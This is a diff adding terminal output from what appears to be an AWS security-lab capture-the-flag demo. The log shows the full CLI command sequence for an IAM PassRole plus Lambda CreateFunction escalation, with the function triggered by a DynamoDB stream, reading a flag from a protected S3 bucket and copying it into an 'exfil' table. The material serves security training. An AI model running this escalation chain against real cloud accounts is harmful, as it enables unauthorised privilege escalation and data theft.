@@ -1,0 +1,117 @@
+[0;32m========================================[0m
+[0;32mIAM PassRole + Lambda CreateFunction + CreateEventSourceMapping (DynamoDB) to S3 Bucket Demo[0m
+[0;32m========================================[0m
+
+[1;33mStep 1: Retrieving scenario configuration from Terraform[0m
+Retrieved access key for: pl-prod-lambda-002-to-bucket-starting-user
+Access Key ID: AKIA2E4JP2...
+Target bucket: pl-prod-lambda-002-to-bucket-697683661464-66pzel
+Trigger table: pl-prod-lambda-002-to-bucket-trigger-table
+Exfil table:   pl-prod-lambda-002-to-bucket-exfil-table
+Region: us-east-1
+[0;32m✓ Retrieved configuration from Terraform[0m
+
+[1;33mStep 2: Configuring AWS CLI with starting user credentials[0m
+Using region: us-east-1
+[2m[Attacker] $ aws sts get-caller-identity --query 'Arn' --output text[0m
+Current identity: arn:aws:iam::123456789012:user/pl-prod-lambda-002-to-bucket-starting-user
+[0;32m✓ Verified starting user identity[0m
+
+[1;33mStep 3: Getting account ID[0m
+[2m[ReadOnly] $ aws sts get-caller-identity --query 'Account' --output text[0m
+Account ID: 123456789012
+[0;32m✓ Retrieved account ID[0m
+
+[1;33mStep 4: Verifying we don't have S3 bucket access yet[0m
+Attempting to access target bucket: pl-prod-lambda-002-to-bucket-697683661464-66pzel
+[2m[Attacker] $ aws s3 ls s3://pl-prod-lambda-002-to-bucket-697683661464-66pzel[0m
+[0;32m✓ Confirmed: Cannot access target bucket (as expected)[0m
+
+[1;33mStep 5: Preparing Lambda function payload[0m
+Creating Python function that will read the flag from S3 and write it to the exfil table...
+[0;32m✓ Lambda function payload prepared[0m
+
+[1;33mStep 6: Creating Lambda function with privileged S3-access role[0m
+This is the privilege escalation vector — passing the S3-access role to Lambda...
+Target Role ARN: arn:aws:iam::123456789012:role/pl-prod-lambda-002-to-bucket-target-role
+Lambda function:  pl-lambda-002-to-bucket-escalation-fn
+
+[0;36m[Attacker] $ aws lambda create-function --region us-east-1 --function-name "pl-lambda-002-to-bucket-escalation-fn" --runtime python3.11 --role "arn:aws:iam::123456789012:role/pl-prod-lambda-002-to-bucket-target-role" --handler lambda_function.lambda_handler --zip-file fileb:///tmp/lambda_function.zip --timeout 30 --environment "Variables={TARGET_BUCKET=pl-prod-lambda-002-to-bucket-697683661464-66pzel,EXFIL_TABLE=pl-prod-lambda-002-to-bucket-exfil-table}"[0m
+Function ARN: arn:aws:lambda:us-east-1:123456789012:function:pl-lambda-002-to-bucket-escalation-fn
+[0;32m✓ Successfully created Lambda function with privileged role![0m
+
+[1;33mStep 7: Waiting for Lambda function to be ready[0m
+Allowing time for Lambda function initialization...
+[0;32m✓ Lambda function ready[0m
+
+[1;33mStep 8: Creating event source mapping to DynamoDB stream[0m
+Linking Lambda function to DynamoDB stream trigger...
+Function: pl-lambda-002-to-bucket-escalation-fn
+Stream:   arn:aws:dynamodb:us-east-1:123456789012:table/pl-prod-lambda-002-to-bucket-trigger-table/stream/2026-05-17T03:17:29.660
+
+[0;36m[Attacker] $ aws lambda create-event-source-mapping --region us-east-1 --function-name "pl-lambda-002-to-bucket-escalation-fn" --event-source-arn "arn:aws:dynamodb:us-east-1:123456789012:table/pl-prod-lambda-002-to-bucket-trigger-table/stream/2026-05-17T03:17:29.660" --starting-position LATEST --batch-size 10[0m
+Event Source Mapping UUID: a0efdb02-e49d-417e-b098-623b43cbee0a
+[0;32m✓ Successfully created event source mapping![0m
+
+[1;33mStep 9: Waiting for event source mapping to become active[0m
+Event source mappings need time to initialize and connect to the stream...
+Event source mapping state: Enabled (waited 10s)
+[0;32m✓ Event source mapping is now active![0m
+
+[1;33mStep 10: Triggering Lambda function and waiting for flag exfiltration[0m
+Note: Event source mappings take time to fully initialize even after showing 'Enabled'
+We'll insert DynamoDB records every 10 seconds and poll the exfil table for the flag...
+
+[0;34mAttempt 1/30: Inserting trigger record...[0m
+  [Switching to admin identity to simulate a legitimate DynamoDB write that triggers the stream]
+
+[0;36m[Attacker (using admin to simulate helpful PutItem)] $ aws dynamodb put-item --region us-east-1 --table-name "pl-prod-lambda-002-to-bucket-trigger-table" --item '{"pk":{"S":"trigger-1"}}'[0m
+  → Trigger record inserted
+[0;32m  → Flag found in exfil table![0m
+
+[0;32m✓ Lambda executed and wrote flag to exfil table![0m
+Took 1 attempt(s) over approximately 10 seconds
+
+[1;33mStep 11: Capturing CTF flag from exfil DynamoDB table[0m
+
+[0;36m[Attacker] $ aws dynamodb get-item --region us-east-1 --table-name "pl-prod-lambda-002-to-bucket-exfil-table" --key '{"pk": {"S": "exfil"}}' --query 'Item.value.S' --output text[0m
+[0;32m✓ Flag captured: flag{MISSING}[0m
+
+
+[0;32m========================================[0m
+[0;32m✅ CTF FLAG CAPTURED![0m
+[0;32m========================================[0m
+
+[1;33mAttack Summary:[0m
+1. Started as: pl-prod-lambda-002-to-bucket-starting-user (no S3 access)
+2. Created Lambda function 'pl-lambda-002-to-bucket-escalation-fn' with privileged role: pl-prod-lambda-002-to-bucket-target-role
+3. Created event source mapping linking Lambda to DynamoDB stream on: pl-prod-lambda-002-to-bucket-trigger-table
+4. Waited for ESM to initialize, then triggered Lambda by inserting a DynamoDB record
+5. Lambda executed with the S3-access role, read flag.txt from: pl-prod-lambda-002-to-bucket-697683661464-66pzel
+6. Lambda wrote the flag to exfil table: pl-prod-lambda-002-to-bucket-exfil-table
+7. Read flag from exfil table: flag{MISSING}
+
+[1;33mAttack Path:[0m
+  pl-prod-lambda-002-to-bucket-starting-user → (PassRole + CreateFunction) → pl-lambda-002-to-bucket-escalation-fn
+  → (CreateEventSourceMapping) → DynamoDB stream trigger on pl-prod-lambda-002-to-bucket-trigger-table
+  → Lambda reads s3://pl-prod-lambda-002-to-bucket-697683661464-66pzel/flag.txt → writes to pl-prod-lambda-002-to-bucket-exfil-table
+  → (dynamodb:GetItem) → CTF Flag
+
+[1;33mAttack Commands:[0m
+  [0;36m$ aws lambda create-function --region us-east-1 --function-name "pl-lambda-002-to-bucket-escalation-fn" --runtime python3.11 --role "arn:aws:iam::123456789012:role/pl-prod-lambda-002-to-bucket-target-role" --handler lambda_function.lambda_handler --zip-file fileb:///tmp/lambda_function.zip --timeout 30 --environment "Variables={TARGET_BUCKET=pl-prod-lambda-002-to-bucket-697683661464-66pzel,EXFIL_TABLE=pl-prod-lambda-002-to-bucket-exfil-table}"[0m
+  [0;36m$ aws lambda create-event-source-mapping --region us-east-1 --function-name "pl-lambda-002-to-bucket-escalation-fn" --event-source-arn "arn:aws:dynamodb:us-east-1:123456789012:table/pl-prod-lambda-002-to-bucket-trigger-table/stream/2026-05-17T03:17:29.660" --starting-position LATEST --batch-size 10[0m
+  [0;36m$ aws dynamodb put-item --region us-east-1 --table-name "pl-prod-lambda-002-to-bucket-trigger-table" --item '{"pk":{"S":"trigger-1"}}'[0m
+  [0;36m$ aws dynamodb get-item --region us-east-1 --table-name "pl-prod-lambda-002-to-bucket-exfil-table" --key '{"pk": {"S": "exfil"}}' --query 'Item.value.S' --output text[0m
+
+[1;33mAttack Artifacts:[0m
+- Lambda Function: pl-lambda-002-to-bucket-escalation-fn
+- Function Role: pl-prod-lambda-002-to-bucket-target-role
+- Event Source Mapping: Linked to DynamoDB stream on pl-prod-lambda-002-to-bucket-trigger-table
+- Exfil item written to: pl-prod-lambda-002-to-bucket-exfil-table (pk=exfil)
+
+[0;31m⚠ Warning: The Lambda function and event source mapping are still active[0m
+[0;31m⚠ Lambda functions incur charges when invoked[0m
+
+[1;33mTo clean up and restore the original state:[0m
+  ./cleanup_attack.sh or use the plabs TUI/CLI
+
